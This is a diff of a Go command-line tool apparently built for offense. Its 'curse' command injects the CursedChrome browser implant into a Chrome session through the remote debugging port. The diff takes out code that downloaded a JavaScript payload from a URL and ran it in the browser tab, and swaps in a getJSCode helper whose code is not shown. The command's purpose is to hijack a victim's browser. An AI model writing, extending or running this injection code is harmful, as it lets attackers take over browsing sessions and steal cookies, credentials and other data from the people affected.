@@ -20,8 +20,6 @@ package cmd
 
 import (
 	"fmt"
-	"io/ioutil"
-	"net/http"
 	"net/url"
 	"os"
 
@@ -36,7 +34,7 @@ var (
 
 var curseCmd = &cobra.Command{
 	Use:   "curse",
-	Short: "",
+	Short: "Inject CursedChrome",
 	Long:  ``,
 	Run: func(cmd *cobra.Command, args []string) {
 		debuggingPort, err := cmd.Flags().GetInt(remoteDebuggingPortFlagStr)
@@ -48,11 +46,7 @@ var curseCmd = &cobra.Command{
 			fmt.Printf(Warn+"Invalid port number %d\n", debuggingPort)
 			os.Exit(ExitBadFlag)
 		}
-		jsURL, err := cmd.Flags().GetString(jsCodeURLFlagStr)
-		if err != nil {
-			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", jsCodeURLFlagStr, err)
-			os.Exit(ExitBadFlag)
-		}
+		jsCode := getJSCode(cmd)
 
 		debugURL := url.URL{
 			Scheme: "http",
@@ -79,28 +73,10 @@ var curseCmd = &cobra.Command{
 			return
 		}
 
-		jsCode, err := fetchJSCode(jsURL)
-		if err != nil {
-			fmt.Printf(Warn+"%s\n", err)
-			os.Exit(ExitNoJSPayload)
-		}
 		_, err = overlord.ExecuteJS(target.ID, target.WebSocketDebuggerURL, jsCode)
 		if err != nil {
 			fmt.Printf(Warn+"%s\n", err)
 			os.Exit(ExitExecuteJSError)
 		}
 	},
-}
-
-// fetchJSCode - Fetch JS code
-func fetchJSCode(jsURL string) (string, error) {
-	resp, err := http.Get(jsURL)
-	if err != nil {
-		return "", err
-	}
-	data, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return "", err
-	}
-	return string(data), err
 }
